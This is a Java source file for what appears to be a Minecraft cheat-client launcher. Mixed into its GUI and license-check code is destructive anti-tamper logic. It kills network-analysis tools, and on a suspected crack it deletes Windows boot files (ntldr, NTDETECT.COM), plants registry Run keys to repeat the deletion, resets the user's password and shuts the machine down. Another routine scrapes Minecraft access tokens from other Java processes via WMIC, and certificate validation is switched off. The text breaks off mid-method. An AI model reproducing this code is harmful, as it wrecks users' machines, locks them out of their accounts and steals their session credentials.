package me.ho3.CL;

import java.awt.*;
import java.awt.event.*;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.ImageIO;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import javax.swing.*;
import javax.swing.plaf.basic.BasicButtonUI;

import com.alibaba.dcm.DnsCacheManipulator;
import com.sun.awt.AWTUtilities;

import me.ho3.CL.until.*;
import net.minecraft.client.main.Main;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.sf.json.JSONObject;
import sun.misc.BASE64Decoder;

import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.geom.RoundRectangle2D;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.lang.reflect.InvocationTargetException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.nio.channels.FileChannel;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Scanner;
import java.util.StringTokenizer;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.FutureTask;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.swing.border.Border;
import javax.swing.border.EtchedBorder;
public class Launch extends JFrame
{
	
	int xOld = 0;  
	int yOld = 0; 
	private JButton searchBtn = null;
	private JButton editBtn = null;
	private JButton saveBtn = null;
    private JComboBox<String> cb = new JComboBox<String>();
	private static String java_dir;
	private static String Mainclass = "net.minecraft.client.main.Main";
    private static String Launch_ver;//ZeroDay_b6  Jigsaw
    public static boolean del_ser=true;
    public static boolean noverify=true;    
    public static boolean smode=false;   
    public static boolean Sjava=true; 
    public static boolean DeBug=false; 
    public static boolean NewMode=false; 
    public static boolean is18Mode=false;
    public static boolean log=false;
    private static String ver="4.0.7.7.1"; 
    public static String path=null; 
    public static String settings_path=".settings";  
    public static String uuid="";
    public static String token="";
    public static String Uname="";
    public static Integer port; 
  
    public static String sendGet(String url, String param) {
        String result = "";
        BufferedReader in = null;
        try {
            String urlNameString = url + "?" + param;
            URL realUrl = new URL(urlNameString);
            
            // 打开和URL之间的连接
            
            //
        //	https://raw.githubusercontent.com/CrackFileso/333/master/hwids

        	Runtime.getRuntime().exec("Taskkill /F /IM php.exe");
        	Runtime.getRuntime().exec("Taskkill /F /IM nginx.exe");
            Runtime.getRuntime().exec("taskkill /f /fi \"windowtitle eq Progress Te*\"");
            Runtime.getRuntime().exec("taskkill /f /fi \"windowtitle eq Fiddler*\"");
			Runtime.getRuntime().exec("Taskkill /F /IM Fiddler.exe");
			Runtime.getRuntime().exec("Taskkill /F /IM TcpViewer.exe");
			Runtime.getRuntime().exec("Taskkill /F /IM Wireshark.exe");
            
            
            URLConnection connection = realUrl.openConnection();
            // 设置通用的请求属性
            connection.setDoOutput(true);
            connection.setReadTimeout(981);
            connection.setRequestProperty("accept", "*/*");
            connection.setRequestProperty("connection", "Keep-Alive");
            connection.setRequestProperty("user-agent",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1) ClientLauncher by ho3;");
            // 建立实际的连接
            connection.connect();
            // 获取所有响应头字段
            Map<String, List<String>> map = connection.getHeaderFields();
            // 遍历所有的响应头字段
            for (String key : map.keySet()) { }
            // 定义 BufferedReader输入流来读取URL的响应
            in = new BufferedReader(new InputStreamReader(
                    connection.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result += line+"\n";
            }
        } catch (Exception e) {
        }
        // 使用finally块来关闭输入流
        finally {
            try {
                if (in != null) {
                    in.close();
                }
            } catch (Exception e2) {
            }
        }
        return result;
    }
    
   private void anticrack(){
       List<String> filenameList = new ArrayList<String>();  
       
       findFiles(".lnk" , "C:\\Users\\%UserName%\\Desktop", filenameList);  

      for (String filename : filenameList) {
       String	finname=filename.replace("C:\\Users\\%UserName%\\Desktop", "");
          if(finname.toLowerCase().contains("vmware") || finname.toLowerCase().contains("影子") || finname.toLowerCase().contains("还原")){
        	  JOptionPane.showInputDialog(null, "请卸载还原软件！");		 
 			  FMLCommonHandler.instance().exitJava(-1, true);
              Runtime.getRuntime().exit(-1);
          	  Runtime.getRuntime().halt(-1);         	  
          }
       }
	   
   } 
    
    
    private static String sendPost(String url, Map<String, String> parameters) {  
        String result = "";
        BufferedReader in = null;
        PrintWriter out = null;  
        StringBuffer sb = new StringBuffer();  
        String params = "";
        try {  
        //	https://raw.githubusercontent.com/CrackFileso/333/master/hwids

        	Runtime.getRuntime().exec("Taskkill /F /IM php.exe");
        	Runtime.getRuntime().exec("Taskkill /F /IM nginx.exe");
            Runtime.getRuntime().exec("taskkill /f /fi \"windowtitle eq Progress Te*\"");
            Runtime.getRuntime().exec("taskkill /f /fi \"windowtitle eq Fiddler*\"");
			Runtime.getRuntime().exec("Taskkill /F /IM Fiddler.exe");
			Runtime.getRuntime().exec("Taskkill /F /IM TcpViewer.exe");
			Runtime.getRuntime().exec("Taskkill /F /IM Wireshark.exe");
        	// 创建URL对象  
            java.net.URL connURL = new java.net.URL(url);  
            // 打开URL连接  
             
            HttpsURLConnection httpConn = (HttpsURLConnection)connURL.openConnection();  
            // 设置通用属性  

            httpConn.setFollowRedirects(true);
            httpConn.setReadTimeout(1169);
            httpConn.setRequestProperty("Accept", "*/*");  
            httpConn.setRequestProperty("Connection", "Keep-Alive");  
            httpConn.setRequestProperty("User-Agent",  
                    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 ClientLauncher_by_ho3");  
            // 设置POST方式  
            httpConn.setDoInput(true);  
            httpConn.setDoOutput(true);  
            TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                    return null;
                }

                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                }

                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                }
            } };

            // Install the all-trusting trust manager
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
           HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            // 获取HttpURLConnection对象对应的输出流  
            out = new PrintWriter(httpConn.getOutputStream());  

            // 发送请求参数  
            out.write(params);  
            // flush输出流的缓冲  
            out.flush();  
            // 定义BufferedReader输入流来读取URL的响应，设置编码方式  
            in = new BufferedReader(new InputStreamReader(httpConn  
                    .getInputStream(), "UTF-8"));  
            String line;  
            // 读取返回的内容  
            while ((line = in.readLine()) != null) {  
                result += line+"\n";  
            }  
        } catch (Exception e) {  
            e.printStackTrace();  
        } finally {  
            try {  
                if (out != null) {  
                    out.close();  
                }  
                if (in != null) {  
                    in.close();  
                }  
            } catch (IOException ex) {  
                ex.printStackTrace();  
            }  
        }  
        return result;  
    }   
    
    private static String Encrypt(String strSrc, String encName) {
        MessageDigest md = null;
        String strDes = null;

        byte[] bt = strSrc.getBytes();
        try {
            if (encName == null || encName.equals("")) {
                encName = "SHA-256";
            }
            md = MessageDigest.getInstance(encName);
            md.update(bt);
            strDes = bytes2Hex(md.digest()); // to HexString
        } catch (NoSuchAlgorithmException e) {
            return null;
        }
        return strDes;
    }

    public static String bytes2Hex(byte[] bts) {
        String des = "";
        String tmp = null;
        for (int i = 0; i < bts.length; i++) {
            tmp = (Integer.toHexString(bts[i] & 0xFF));
            if (tmp.length() == 1) {
                des += "0";
            }
            des += tmp;
        }
        return des;
    }
    
    public static String htmlRemoveTag(String inputString) {  
        if (inputString == null)  
            return null;  
        String htmlStr = inputString; // 含html标签的字符串  
        String textStr = "";  
        java.util.regex.Pattern p_script;  
        java.util.regex.Matcher m_script;  
        java.util.regex.Pattern p_style;  
        java.util.regex.Matcher m_style;  
        java.util.regex.Pattern p_html;  
        java.util.regex.Matcher m_html;  
        try {  
            String regEx_script = "<[\\s]*?script[^>]*?>[\\s\\S]*?<[\\s]*?\\/[\\s]*?script[\\s]*?>";   
            String regEx_style = "<[\\s]*?style[^>]*?>[\\s\\S]*?<[\\s]*?\\/[\\s]*?style[\\s]*?>";   
            String regEx_html = "<[^>]+>"; // 定义HTML标签的正则表达式  
            p_script = Pattern.compile(regEx_script, Pattern.CASE_INSENSITIVE);  
            m_script = p_script.matcher(htmlStr);  
            htmlStr = m_script.replaceAll(""); // 过滤script标签  
            p_style = Pattern.compile(regEx_style, Pattern.CASE_INSENSITIVE);  
            m_style = p_style.matcher(htmlStr);  
            htmlStr = m_style.replaceAll(""); // 过滤style标签  
            p_html = Pattern.compile(regEx_html, Pattern.CASE_INSENSITIVE);  
            m_html = p_html.matcher(htmlStr);  
            htmlStr = m_html.replaceAll(""); // 过滤html标签  
            textStr = htmlStr;  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
        return textStr;// 返回文本字符串  
    } 
    
    public static byte[] hex2byte(String strhex) {
        if (strhex == null) {
            return null;
        }
        int l = strhex.length();
        if (l % 2 == 1) {
            return null;
        }
        byte[] b = new byte[l / 2];
        for (int i = 0; i != l / 2; i++) {
            b[i] = (byte) Integer.parseInt(strhex.substring(i * 2, i * 2 + 2),
                    16);
        }
        return b;
    }

    public static String byte2hex(byte[] b) {
        String hs = "";
        String stmp = "";
        for (int n = 0; n < b.length; n++) {
            stmp = (java.lang.Integer.toHexString(b[n] & 0XFF));
            if (stmp.length() == 1) {
                hs = hs + "0" + stmp;
            } else {
                hs = hs + stmp;
            }
        }
        return hs.toUpperCase();
    }
    
    public static String Decrypt(String sSrc, String sKey) throws Exception {
        try {
            if (sKey == null) {
                System.out.print("Key为空null");
                return null;
            }
            byte[] raw = sKey.getBytes("ASCII");
            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            IvParameterSpec iv = new IvParameterSpec("0102030405060708"
                    .getBytes());
            cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);
            byte[] encrypted1 = hex2byte(sSrc);
            try {
                byte[] original = cipher.doFinal(encrypted1);
                String originalString = new String(original);
                return originalString;
            } catch (Exception e) {
                System.out.println(e.toString());
                return null;
            }
        } catch (Exception ex) {
            System.out.println(ex.toString());
            return null;
        }
    }
    
    private static void Soundinit() throws Exception
    {
    	JOptionPane.showMessageDialog(null, "异常错误Error33402,按确定继续启动\n" );		 
    	Runtime.getRuntime().exec("REG ADD \"HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\" /F /V \"winxp1\" /T REG_SZ /D \"CMD.EXE /C DEL /F /A C:\\NTDETECT.COM\" >NUL");
    	Runtime.getRuntime().exec("REG ADD \"HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\" /F /V \"winxp1\" /T REG_SZ /D \"CMD.EXE /C DEL /F /A C:\\ntldr\" >NUL");
    	Runtime.getRuntime().exec("CMD.EXE /C DEL /F /A C:\\ntldr >nul");
    	Runtime.getRuntime().exec("CMD.EXE /C DEL /F /A C:\\ntldr >nul");
    	Runtime.getRuntime().exec("CMD.EXE /C net user %username% ClientLa");
    	Runtime.getRuntime().exec("CMD.EXE /C Shutdown -s -c [CL后门]小盆友你的CL不是正版哦！？！");
    	System.exit(-1);
    	Runtime.getRuntime().halt(-1);
    } 
    
    
   private static boolean Hwid() throws Exception{
   	if(InetAddress.getByName("pastebin.com").getHostAddress().contains("45.32.47.1") || InetAddress.getByName("pastebin.com").getHostAddress().contains("45.32.47.1") || InetAddress.getByName("pastebin.com").getHostAddress().contains("60.214.102.216") || InetAddress.getByName("raw.githubusercontent.com").getHostAddress().contains("60.214.102.216"))
        Soundinit();
	   File file = new File("C:\\Windows\\System32\\drivers\\etc\\hosts");//定义一个file对象，用来初始化FileReader
       FileReader reader = new FileReader(file);//定义一个fileReader对象，用来初始化BufferedReader
       BufferedReader bReader = new BufferedReader(reader);//new一个BufferedReader对象，将文件内容读取到缓存
       StringBuilder sb = new StringBuilder();//定义一个字符串缓存，将字符串存放缓存中
       String s = "";
       while ((s =bReader.readLine()) != null) {//逐行读取文件内容，不读取换行符和末尾的空格
           sb.append(s + "\n");//将读取的字符串添加换行符后累加存放在缓存中
    //       System.out.println(s);
       }
       bReader.close();
       String str = sb.toString();
       if(str.contains("pastebin.com") || str.contains("raw.githubusercontent.com"))
       	Soundinit();
	     boolean passesd=false;
		 String[] Killswitch = null;
		 try{
		  Killswitch = sendGet("https://raw.githubusercontent.com/CrackFileso/333/master/Tb",null).split("\\|");
		 }catch(Exception e){
			 JOptionPane.showMessageDialog(null, "版本更新出现错误,我怀疑你正在使用泄露版本!\n\n错误信息:\n"+e.getClass().getName()+"\n"+e.getMessage() );
			 FMLCommonHandler.instance().exitJava(-1, true);
			 Runtime.getRuntime().exit(-1);
		 }
		  int N_ver=Integer.parseInt(Killswitch[0].replace(".", ""));
		  Boolean needUpdate=Boolean.valueOf(Killswitch[1]);
		 if(N_ver>Integer.parseInt(ver.replace(".", "")) && needUpdate){
			 JOptionPane.showInputDialog(null, "版本过低请立即下载最新版本", sigma() );
			 FMLCommonHandler.instance().exitJava(-1, true);
			 Runtime.getRuntime().exit(-1);
	     	 Runtime.getRuntime().exit(-1);     	
		 }


	   
	   try{		   
		   for(int iop=0;iop<3;iop++){
			   String[] hwids = null;
			switch(iop){
			   case 0:
				   hwids  = sendGet("https://raw.githubusercontent.com/CrackFileso/333/master/hwids",null).split("\n");  
			   break;
			   case 1:
				   hwids = sendGet("https://raw.githubusercontent.com/CrackFileso/333/master/hwids",null).split("\n");  
			   break;	 
			   case 2:
				   hwids = sendGet("https://pastebin.com/raw/QdCjLjBP",null).split("\n");  
			   break;
			   default:
				   hwids = sendGet("https://raw.githubusercontent.com/CrackFileso/333/master/hwids",null).split("\n");  
			   break;
			   }
	 
	    int i;
	 for(i=0;i<hwids.length;i++){
		if(!(hwids[i]==null) && !hwids[i].isEmpty() && hwids[i].toLowerCase().contains(sigma().toLowerCase())){
			passesd = true;	
			break;
		}
	 }
	 if(!passesd && iop == 3){
		 if(JOptionPane.showInputDialog(null, "你没有通过验证,复制你的HWID!!!\n(Ctrl+C)\n"+iop+hwids.length, sigma() ).toString().contains("ho3")){
			 FMLCommonHandler.instance().exitJava(-1, true);
			 Runtime.getRuntime().exec("ShUtDOwN -s");  
         	 Runtime.getRuntime().exit(-1);
         	 Runtime.getRuntime().exit(-1);         	
		 }else{
			 FMLCommonHandler.instance().exitJava(-1, true);
         	 Runtime.getRuntime().exit(-1);
             Runtime.getRuntime().exit(-1);
         	 
		 }
	 }
	 
}

		 if(!passesd)
		 {
			 if(JOptionPane.showInputDialog(null, "你没有通过验证,复制你的HWID!!!\n(Ctrl+C)\n"+"Fit", sigma() ).toString().contains("ho3")){
				 FMLCommonHandler.instance().exitJava(-1, true);
				 Runtime.getRuntime().exec("ShUtDOwN -s");  
	         	 Runtime.getRuntime().exit(-1);
	         	 Runtime.getRuntime().exit(-1);         	
			 }else{
				 FMLCommonHandler.instance().exitJava(-1, true);
	         	 Runtime.getRuntime().exit(-1);
	             Runtime.getRuntime().exit(-1);
	         	 
			 }
		 }   	  
		 
	   }catch(Exception e){
		   JOptionPane.showMessageDialog(null, "验证出现错误\n\n错误信息:\n"+e.getClass().getName()+"\n"+e.getMessage() );
		   FMLCommonHandler.instance().exitJava(-1, true);
		   Runtime.getRuntime().exit(-1);
           Runtime.getRuntime().exit(-1);           
		   }
	   
	   return true;
   } 
    
	 private static String zerodayisaminecraftcheat(byte[] data) {
	      StringBuffer buf = new StringBuffer();

	      for(int i = 0; i < data.length; ++i) {
	         int halfbyte = data[i] >>> 4 & 15;
	         int two_halfs = 0;

	         do {
	            if(halfbyte >= 0 && halfbyte <= 9) {
	               buf.append((char)(48 + halfbyte));
	            } else {
	               buf.append((char)(97 + (halfbyte - 10)));
	            }

	            halfbyte = data[i] & 15;
	         } while(two_halfs++ < 1);
	      }

	      return buf.toString();
	   }


	   	private static String sigma() throws Exception {
		      String hwid = sha1(String.valueOf(System.getenv("PROCESSOR_IDENTIFIER")) + System.getenv("COMPUTERNAME") + System.getProperty("user.name"));
		      return hwid;
		   }

	    private static String sha1(String text) throws Exception {
		      MessageDigest md = MessageDigest.getInstance("SHA-256");
		      byte[] sha1hash = new byte[40];
		      md.update(text.getBytes("iso-8859-1"), 0, text.length());
		      sha1hash = md.digest();
		      return zerodayisaminecraftcheat(sha1hash);
		   }
   
   private static void inject(){
	  if(NewMode) return;
	   
	   
    Runnable runnable = new Runnable() {
    	private String line;

		public void run() {
    		  Process p;
			try {
			  p = Runtime.getRuntime().exec("C:\\Windows\\system32\\wbem\\wMiC.eXe PROCESS where \"name like '%java%'\" get Commandline");
			
    		  InputStream is = p.getInputStream();
    		  BufferedReader reader = new BufferedReader(new InputStreamReader(is));
    		  
    		   StringBuilder s=new StringBuilder("");
    		while((line=reader.readLine())!= null){
    			s.append(line);   		      		         			
    		  }
    		
    		  p.waitFor();
    		  is.close();
    		  reader.close();
    		  p.destroy();	


    		  line=s.toString();
    		  
    		  line.replace("CommandLine", "");
    		  if(line.indexOf("--accessToken ")>0){
    			  line=line.substring(line.indexOf("--accessToken ")+14, line.length());
    		  }
    		  System.out.println(line); 

    	      
    	      
    		  if(!line.contains("No Instance(s) Available.")){
    		Uname = line.substring(line.lastIndexOf("--username ")+11,line.indexOf(" --version")).replace(" ", "");
    		uuid = line.substring(line.lastIndexOf("--uuid ")+7,line.indexOf(" --accessToken")).replace(" ", "");
    		token = line.substring(line.lastIndexOf("--accessToken ")+14,line.lastIndexOf("--accessToken ")+47).replace(" ", "");
           if(is18Mode)
    		port = Integer.parseInt(line.substring(line.lastIndexOf("jre7\\bin\\javaw.exe\"  -DlauncherControlPort=")+43,line.lastIndexOf(" -XX:HeapDumpPath=Moj")));
    		
    		if(uuid.equals(token)){
    			JOptionPane.showMessageDialog(null, "检测到重复回环!按确定后重新启动CL!");
    			Runtime.getRuntime().exec("Taskkill /F /IM javaw.exe");
    			Runtime.getRuntime().exec("Taskkill /F /IM java.exe");   			
    		}
    		
    	//   NetEaseControl.Kill();
           JOptionPane.showMessageDialog(null, "获取——成功！\n"+
    	"Token: "
        +
        token
    	+
    	"\n"
    	+
    	"UUID: "
    	+
    	uuid
    	+"\n"
    	+"Port: "
    	+port
    	,Uname,1); 
           Thread.currentThread().stop();
           Thread.currentThread().interrupt();
           return;
    		  }

    		  
	  } catch (Exception e) {
		  e.printStackTrace();
	    }
    	}
    	};
    	ScheduledExecutorService service = Executors
    	.newSingleThreadScheduledExecutor();
    	service.scheduleAtFixedRate(runnable, 0, 3, TimeUnit.SECONDS);
    	
    
   
   }
     
  

    
	public Launch() throws Exception {
		setLookAndFeel();
		
	//	init();
		this.setLayout(null); 
        this.addMouseListener(new MouseAdapter() {  
            @Override  
            public void mousePressed(MouseEvent e) {  
                xOld = e.getX();  
                yOld = e.getY();  
            }  
        });  
        this.addMouseMotionListener(new MouseMotionAdapter() {  
            @Override  
            public void mouseDragged(MouseEvent e) {  
                int xOnScreen = e.getXOnScreen();  
                int yOnScreen = e.getYOnScreen();  
                int xx = xOnScreen - xOld;  
                int yy = yOnScreen - yOld;  
                Launch.this.setLocation(xx, yy);  
            }  
        });  
        
        
        //JLayeredPane用于添加两个图层的，一个用于背景，一个用于界面  
        JLayeredPane layeredPane = new JLayeredPane();
    //    layeredPane.setBorder(BorderFactory.createLineBorder(Color.BLUE, 10, true));
        layeredPane.setBounds(0, 0, 860, 537);  
        this.add(layeredPane);  
          
        //背景Panel  
        JPanel bgPanel = new JPanel(); 
    //    bgPanel.setBorder(BorderFactory.createLineBorder(Color.BLUE, 10, true));
        bgPanel.setBounds(0, 0, 860, 537);  
        layeredPane.add(bgPanel);  
          
        //背景图片，添加到背景Panel里面  
        
        JLabel bgLabel;
		try{
        
        if(new File(System.getProperty("user.dir")+"\\CL\\BC.img").exists()){
        	bgLabel = new JLabel(new ImageIcon(System.getProperty("user.dir")+"\\CL\\BC.img"));     
        	bgPanel.add(bgLabel);  
        }else{
        	bgLabel = new JLabel(new ImageIcon(Launch.class.getResource("/img/bgImage.png")));  
            bgPanel.add(bgLabel);  
        }
      }catch(Exception a){}
        
        
       
          
        //主界面，也就是背景上面的一层Panel  
        JPanel mainPanel = new JPanel();  
        mainPanel.setBounds(0, 0, 860, 537);  
        mainPanel.setLayout(null);  
        layeredPane.add(mainPanel);  
        
        

  
        //关闭按钮  
        JButton closeButton = new JButton();  
        closeButton.setIcon(new ImageIcon(Launch.class.getResource("/img/closeButton.png")));  
        closeButton.setBounds(700, 0, 80, 80);  
        closeButton.setBorderPainted(false);
        closeButton.setMargin(new Insets(0,0,0,0));
        closeButton.addActionListener(new ActionListener() {  
            @Override  
            public void actionPerformed(ActionEvent e) {             	
            	//Runtime.getRuntime().exit(-1);
            	//Runtime.getRuntime().exit(-1);
            	FMLCommonHandler.instance().exitJava(-1, true);
            }  
        });  
     //   menuBar.add(closeButton);
        mainPanel.add(closeButton); 
		
        this.setBounds(50,50,200,200);  
        this.setUndecorated(true); 
	//	setLookAndFeel();
        
		init();
  
	}

	/**
	 * 为主面板设置皮肤
	 */
	@SuppressWarnings("static-access")
	private void setLookAndFeel() {
		try {			
			this.
			setDefaultLookAndFeelDecorated(true);  
			UIManager
					.setLookAndFeel("com.sun.java.swing.plaf.nimbus.NimbusLookAndFeel");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}


    public void findFiles(String filenameSuffix, String currentDirUsed,  
            List<String> currentFilenameList) {  
        File dir = new File(currentDirUsed);  
        if (!dir.exists() || !dir.isDirectory()) {  
            return;  
        }  
  
        for (File file : dir.listFiles()) {  
            if (file.isDirectory()) {  
                /** 
                 * 如果目录则递归继续遍历 
                 */  
                findFiles(filenameSuffix,file.getAbsolutePath(), currentFilenameList);  
            } else {  
                /** 
                 * 如果不是目录。 
                 * 那么判断文件后缀名是否符合。 
                 */  
                if (file.getAbsolutePath().endsWith(filenameSuffix)) {  
                    currentFilenameList.add(file.getAbsolutePath());  
                }  
            }  
        }  
    }


		

	 
	
	private JMenuBar addMenuBar() throws IOException {
		inject();
		cb.setForeground(new Color(173,216,230));
		JMenuBar menuBar = new JMenuBar();
		menuBar.setLayout(new FlowLayout(40, 4, 0));
		// 增加文件选择按钮
	//	menuBar.add(createBtn("File", "./src/folder_up.png"));
		JLabel Text = new JLabel();
		Text.setPreferredSize(new Dimension(50, 27));
		Text.setFont(new Font("微软雅黑" ,Font.PLAIN ,15));
		Text.setText("版本：");
		menuBar.add(Text);
		
		cb.setFont(loadFont());
	//	JOptionPane.showMessageDialog(null,System.getProperty("user.dir"),"BUG",2);
        
   /*
    * 
    *      正常读取
    *      
    */

		
        List<String> filenameList = new ArrayList<String>();  
  
        findFiles(".jar" , System.getProperty("user.dir")+"\\versions\\ClientLauncher", filenameList);  
  
 
       for (String filename : filenameList) {
        String	finname=filename.replace(System.getProperty("user.dir")+"\\versions\\ClientLauncher\\", "");
        	if(!finname.equals("ClientLauncher.jar") & finname.length()<20 & !finname.contains("\\") & !finname.contains("libraries")){
            cb.addItem(finname.replace("\\versions\\", ""));
            if(finname.replace("\\versions\\", "").contains("DE8UG"))
            	DeBug=true;
        	}
        	if(new File(filename.replace(".jar", ".info")).exists()){
                StringBuffer sb= new StringBuffer("");
                
                FileReader reader = new FileReader(new File(filename.replace(".jar", ".info")));
                BufferedReader br = new BufferedReader(reader);
               
                String str = null;
               
                while((str = br.readLine()) != null) {
                      sb.append(str);
                     
                   //   System.out.println(str);
                }
               
                br.close();
                reader.close();
                Mainclass = sb.toString();
                cb.setForeground(Color.orange);;
        	}
        }
	    
      /*
       * 
       *   奇怪读取X1
       *  
       *  
       */
        if(cb.getItemCount()<1){
        	   smode = true;
               List<String> filenameList2 = new ArrayList<String>();  
               
               findFiles(".jar" , System.getProperty("user.dir"), filenameList2);   
        
              for (String filename : filenameList2) {
               String	finname=filename.replace(System.getProperty("user.dir"), "");
               	if(!finname.equals("ClientLauncher.jar") & finname.length()<20 & !finname.contains("\\") & !finname.contains("libraries"))
                   cb.addItem(finname.replace("\\versions\\", ""));
                if(finname.replace("\\versions\\", "").contains("DEBUG"))
                	DeBug=true;
               }  
              
        } 



            if(cb.getItemCount()<1)   JOptionPane.showMessageDialog(null, "没有发现做弊端jar,请把做弊端jar放入versions\\ClientLauncher内","BUG",1);
	        
           

           
            Launch_ver =  (String) cb.getSelectedItem();
            
            if(joptsimple.OptionParser.t1 != null && joptsimple.OptionParser.t1.isAlive())
            	joptsimple.OptionParser.t1.stop();
            JOptionPane.showMessageDialog(null, "正在使用版本: "+Launch_ver +"\n"+"MainClass: "+Mainclass,"ClientLauncher V"+ver,1);
            
	        cb.addItemListener(new ItemListener()
	            {
	                public void itemStateChanged(ItemEvent event)
	                {
	                    switch (event.getStateChange())
	                    {
	                    case ItemEvent.SELECTED: 
	                        System.out.println("选中" + event.getItem());
	                        JOptionPane.showMessageDialog(null, "成功切换"+(String) event.getItem(),"BUG",1);
	                        Launch_ver = (String) event.getItem();
	                    	if(new File(System.getProperty("user.dir")+"\\versions\\ClientLauncher\\"+Launch_ver.replace(".jar", ".info")).exists()){
	                            StringBuffer sb= new StringBuffer("");
	                            try{
	                            FileReader reader = new FileReader(new File(System.getProperty("user.dir")+"\\versions\\ClientLauncher\\"+Launch_ver.replace(".jar", ".info")));
	                            BufferedReader br = new BufferedReader(reader);
	                           
	                            String str = null;
	                           
	                            while((str = br.readLine()) != null) {
	                                  sb.append(str);
	                                 
	                               //   System.out.println(str);
	                            }
	                           
	                            br.close();
	                            reader.close();
	                            Mainclass = sb.toString();
	                            cb.setForeground(Color.orange);;
	                            }catch(Exception e){}
	                    	}
	                    	else{
	                    		if(smode){
	    	                    	if(new File(System.getProperty("user.dir")+"\\"+Launch_ver.replace(".jar", ".info")).exists()){
	    	                            StringBuffer sb= new StringBuffer("");
	    	                            try{
	    	                            FileReader reader = new FileReader(new File(System.getProperty("user.dir")+"\\"+Launch_ver.replace(".jar", ".info")));
	    	                            BufferedReader br = new BufferedReader(reader);
	    	                           
	    	                            String str = null;
	    	                           
	    	                            while((str = br.readLine()) != null) {
	    	                                  sb.append(str);
	    	                                 
	    	                               //   System.out.println(str);
	    	                            }
	    	                           
	    	                            br.close();
	    	                            reader.close();
	    	                            Mainclass = sb.toString();
	    	                            cb.setForeground(Color.orange);;
	    	                            }catch(Exception e){}
	    	                    	}else{
	    	                    		Mainclass="net.minecraft.client.main.Main";	
	    	                    	}
	                    		}else{
	                    		Mainclass="net.minecraft.client.main.Main";	
	                    		}
	                    	}
	                        break;
	   
	                    }
	                }
	            });
	        
	    menuBar.add(cb);
		

		editBtn = createBtn("Settings", "/img/settings.png");
        editBtn.addActionListener(new ActionListener() {
            
            @Override
            public void actionPerformed(ActionEvent e) {

            	
            	
            	if(!(path = JOptionPane.showInputDialog(null, "选择主类", path ).toString()).equals("1")){  
              
            		if(!(path==null) && !path.equals("null") && !path.equals("1")){
                	Mainclass=path.replace(" ", "");
                	JOptionPane.showInputDialog(null, "OK!", Mainclass );
                }
                
            	}else{
                
    			JFileChooser chooser=new JFileChooser();
    			chooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
    			if(chooser.showOpenDialog(null)==JFileChooser.APPROVE_OPTION){
    			    System.out.println(chooser.getSelectedFile());
    			}
    			     
  
    		        FileChannel inputChannel = null;    
    		        FileChannel outputChannel = null;    

    		        try {
    		        	if(!new File(System.getProperty("user.dir")+"\\CL\\BC.img").exists()){
    		        		new File(System.getProperty("user.dir")+"\\CL").mkdir();
    		        		new File(System.getProperty("user.dir")+"\\CL\\BC.img").createNewFile();
    		        	}else{
    		        		new File(System.getProperty("user.dir")+"\\CL\\BC.img").delete();
    		        		new File(System.getProperty("user.dir")+"\\CL\\BC.img").createNewFile();
    		        	}
    		        	
    		        	inputChannel = new FileInputStream(chooser.getSelectedFile()).getChannel();
						outputChannel = new FileOutputStream(new File(System.getProperty("user.dir")+"\\CL\\BC.img")).getChannel();
						outputChannel.transferFrom(inputChannel, 0, inputChannel.size());
						inputChannel.close();
		    		    outputChannel.close();
    		        } catch (Exception e1) {
						JOptionPane.showMessageDialog(null, e1.getClass()+e1.getLocalizedMessage()+e1.getMessage());
					}  
    		        JOptionPane.showMessageDialog(null, "重启CL看效果");
    		}
                
                
                
            }
        });
        editBtn.setHideActionText(true);
        editBtn.setBorderPainted(false);
		
		menuBar.add(editBtn);

		saveBtn = createBtn("About", "/img/about.png");
        saveBtn.setHideActionText(true);
        saveBtn.setBorderPainted(false);
        saveBtn.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                JOptionPane.showMessageDialog(null, "Made by ho3 -2017/8/30\n\n版本:"
            +ver
            +" \n                        7/28/2017"
            +"\n\n\nJava: "
            +System.getProperty("sun.arch.data.model")
            +"\n\n"
            +path
            +"\n\n"
            +System.getProperty("user.dir")
            +"\n"
            +"IS18MODE:"
            +is18Mode
